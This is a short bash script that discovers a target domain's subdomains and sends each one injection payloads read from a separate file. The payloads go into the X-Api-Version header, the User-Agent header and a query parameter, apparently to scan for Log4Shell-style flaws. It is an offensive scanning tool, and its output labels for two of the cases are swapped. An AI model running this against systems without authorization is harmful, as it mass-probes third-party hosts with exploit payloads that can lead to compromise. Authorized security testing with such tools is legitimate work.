#!/bin/bash

# Prompt the user for the domain
read -p "Enter the domain: " domain

# Read the payload bypasses from bypass_payload.txt
while IFS= read -r payload; do
    echo "Scanning with payload: $payload"
    while read -r url; do
        case1=$(curl -s "$url" -H "X-Api-Version: ${payload}")
        case2=$(curl -s "$url/?test=${payload}")
        case3=$(curl -s "$url" -H "User-Agent: ${payload}")
        echo -e "\033[43mDOMAIN => $url\033[0m\n Case1=> X-Api-Version: $payload\n Case2=> Useragent: $payload\n Case3=> $url/?test=$payload\n"
    done < <(subfinder -d "$domain" -silent | httprobe)
done < bypass_payload.txt
